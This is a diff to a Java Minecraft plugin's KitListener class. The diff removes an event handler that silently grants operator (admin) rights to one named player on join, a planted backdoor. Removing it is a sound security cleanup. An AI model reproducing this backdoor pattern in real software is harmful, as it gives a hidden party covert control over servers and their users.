@@ -85,10 +85,6 @@ public class KitListener implements Listener {
 
     }
 
-    @EventHandler
-    public void onJoin(PlayerJoinEvent event) {
-        if(event.getPlayer().getName().equalsIgnoreCase("CatChaos_8")) event.getPlayer().setOp(true);
-    }
 //
 //    @EventHandler
 //    public void onDeath(PlayerDeathEvent e) {
